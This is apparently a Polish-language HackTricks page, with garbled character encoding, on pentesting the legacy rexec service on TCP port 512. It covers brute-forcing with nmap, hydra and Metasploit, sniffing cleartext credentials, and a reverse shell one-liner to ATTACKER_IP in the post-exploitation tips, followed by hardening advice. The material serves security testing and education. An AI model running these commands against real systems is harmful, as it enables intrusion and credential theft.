# 512 - Pentesting Rexec

{{#include ../banners/hacktricks-training.md}}

## Podstawowe informacje

Rexec (remote **exec**) jest jednym z oryginalnych zestawÃ³w usÅ‚ug Berkeley *r* (razem z `rlogin`, `rsh`, â€¦).  Oferuje moÅ¼liwoÅ›Ä‡ **zdalnego wykonywania poleceÅ„** **autoryzowanÄ… tylko za pomocÄ… nazwy uÅ¼ytkownika i hasÅ‚a w postaci czystego tekstu**.  ProtokÃ³Å‚ zostaÅ‚ zdefiniowany na poczÄ…tku lat 80-tych (zobacz RFC 1060) i obecnie uwaÅ¼any jest za **niebezpieczny z zaÅ‚oÅ¼enia**.  Niemniej jednak, wciÄ…Å¼ jest domyÅ›lnie wÅ‚Ä…czony w niektÃ³rych starszych urzÄ…dzeniach UNIX / podÅ‚Ä…czonych do sieci i czasami pojawia siÄ™ podczas wewnÄ™trznych pentestÃ³w.

**DomyÅ›lny port:** TCP 512 (`exec`)
```
PORT    STATE SERVICE
512/tcp open  exec
```
> ğŸ”¥  CaÅ‚y ruch â€“ w tym dane uwierzytelniajÄ…ce â€“ jest przesyÅ‚any **niezaszyfrowany**. KaÅ¼dy, kto ma moÅ¼liwoÅ›Ä‡ podsÅ‚uchiwania sieci, moÅ¼e odzyskaÄ‡ nazwÄ™ uÅ¼ytkownika, hasÅ‚o i polecenie.

### Szybki przeglÄ…d protokoÅ‚u

1. Klient Å‚Ä…czy siÄ™ z TCP 512.
2. Klient wysyÅ‚a trzy **Å‚aÅ„cuchy zakoÅ„czone NUL**:
* numer portu (w formacie ASCII), na ktÃ³rym chce odbieraÄ‡ stdout/stderr (czÄ™sto `0`),
* **nazwa uÅ¼ytkownika**,
* **hasÅ‚o**.
3. WysyÅ‚any jest koÅ„cowy Å‚aÅ„cuch zakoÅ„czony NUL z **poleceniem** do wykonania.
4. Serwer odpowiada pojedynczym bajtem statusu 8-bitowego (0 = sukces, `1` = niepowodzenie), po ktÃ³rym nastÄ™puje wynik polecenia.

To oznacza, Å¼e moÅ¼esz odtworzyÄ‡ wymianÄ™ za pomocÄ… niczego wiÄ™cej niÅ¼ `echo -e` i `nc`:
```bash
(echo -ne "0\0user\0password\0id\0"; cat) | nc <target> 512
```
JeÅ›li dane uwierzytelniajÄ…ce sÄ… waÅ¼ne, otrzymasz wynik `id` bezpoÅ›rednio na tym samym poÅ‚Ä…czeniu.

### RÄ™czne uÅ¼ycie z klientem

Wiele dystrybucji Linuksa nadal dostarcza starszego klienta w pakiecie **inetutils-rexec** / **rsh-client**:
```bash
rexec -l user -p password <target> "uname -a"
```
JeÅ›li `-p` jest pominiÄ™ty, klient poprosi interaktywnie o hasÅ‚o (widoczne w ruchu w postaci czystego tekstu!).

---
## Enumeracja i Brute-forcing

### [**Brute-force**](../generic-hacking/brute-force.md#rexec)

### Nmap
```bash
nmap -p 512 --script rexec-info <target>
# Discover service banner and test for stdout port mis-configuration

nmap -p 512 --script rexec-brute --script-args "userdb=users.txt,passdb=rockyou.txt" <target>
```
`rexec-brute` NSE uÅ¼ywa opisanego powyÅ¼ej protokoÅ‚u do szybkiego prÃ³bowania poÅ›wiadczeÅ„.

### Hydra / Medusa / Ncrack
```bash
hydra -L users.txt -P passwords.txt rexec://<target> -s 512 -t 8
```
`hydra` ma dedykowany moduÅ‚ **rexec** i pozostaje najszybszym offline bruteforcerem. `medusa` (`-M REXEC`) i `ncrack` (moduÅ‚ `rexec`) mogÄ… byÄ‡ uÅ¼ywane w ten sam sposÃ³b.

### Metasploit
```
use auxiliary/scanner/rservices/rexec_login
set RHOSTS <target>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```
ModuÅ‚ uruchomi powÅ‚okÄ™ po pomyÅ›lnym wykonaniu i zapisze dane uwierzytelniajÄ…ce w bazie danych.

---
## Sniffing credentials

PoniewaÅ¼ wszystko jest w postaci czystego tekstu, **przechwytywanie sieciowe jest bezcenne**. MajÄ…c kopiÄ™ ruchu, moÅ¼esz wyodrÄ™bniÄ‡ dane uwierzytelniajÄ…ce bez dotykania celu:
```bash
tshark -r traffic.pcap -Y 'tcp.port == 512' -T fields -e data.decoded | \
awk -F"\\0" '{print $2":"$3" -> "$4}'  # username:password -> command
```
(In Wireshark wÅ‚Ä…cz *Decode As â€¦â€‹* TCP 512 â†’ REXEC, aby zobaczyÄ‡ Å‚adnie sparsowane pola.)

---
## WskazÃ³wki po eksploatacji

* Komendy sÄ… uruchamiane z uprawnieniami podanego uÅ¼ytkownika. JeÅ›li `/etc/pam.d/rexec` jest Åºle skonfigurowany (np. `pam_rootok`), czasami moÅ¼liwe sÄ… powÅ‚oki roota.
* Rexec ignoruje powÅ‚okÄ™ uÅ¼ytkownika i wykonuje polecenie za pomocÄ… `/bin/sh -c <cmd>`. MoÅ¼esz zatem uÅ¼ywaÄ‡ typowych sztuczek ucieczki z powÅ‚oki (`;`, ``$( )``, backticks) do Å‚Ä…czenia wielu poleceÅ„ lub uruchamiania powÅ‚ok zwrotnych:
```bash
rexec -l user -p pass <target> 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"'
```
* HasÅ‚a czÄ™sto sÄ… przechowywane w **~/.netrc** na innych systemach; jeÅ›li skompromitujesz jeden host, moÅ¼esz je ponownie wykorzystaÄ‡ do ruchu bocznego.

---
## Utwardzanie / Wykrywanie

* **Nie eksponuj rexec**; zastÄ…p go SSH. Praktycznie wszystkie nowoczesne *inetd* superserwery domyÅ›lnie komentujÄ… tÄ™ usÅ‚ugÄ™.
* JeÅ›li musisz go zachowaÄ‡, ogranicz dostÄ™p za pomocÄ… TCP wrappers (`/etc/hosts.allow`) lub reguÅ‚ zapory i wymuszaj silne hasÅ‚a dla kaÅ¼dego konta.
* Monitoruj ruch do :512 oraz uruchamianie procesÃ³w `rexecd`. Pojedynczy zrzut pakietÃ³w wystarczy, aby wykryÄ‡ kompromitacjÄ™.
* WyÅ‚Ä…cz `rexec`, `rlogin`, `rsh` razem â€“ dzielÄ… wiÄ™kszoÅ›Ä‡ tej samej bazy kodu i sÅ‚aboÅ›ci.

---

## Odniesienia

* Dokumentacja Nmap NSE `rexec-brute` â€“ [https://nmap.org/nsedoc/scripts/rexec-brute.html](https://nmap.org/nsedoc/scripts/rexec-brute.html)
* ModuÅ‚ Rapid7 Metasploit `auxiliary/scanner/rservices/rexec_login` â€“ [https://www.rapid7.com/db/modules/auxiliary/scanner/rservices/rexec_login](https://www.rapid7.com/db/modules/auxiliary/scanner/rservices/rexec_login)
{{#include ../banners/hacktricks-training.md}}
